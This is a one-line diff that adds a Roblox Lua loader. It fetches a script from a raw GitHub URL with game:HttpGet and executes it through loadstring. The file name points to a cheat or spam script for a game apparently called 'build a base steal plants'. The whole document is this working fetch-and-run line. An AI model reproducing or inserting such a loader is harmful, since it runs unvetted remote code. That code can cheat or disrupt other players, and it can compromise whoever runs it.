@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/build-a-base-steal-plants-co-op-spam2-wd32wjjehs8spz.lua"))()
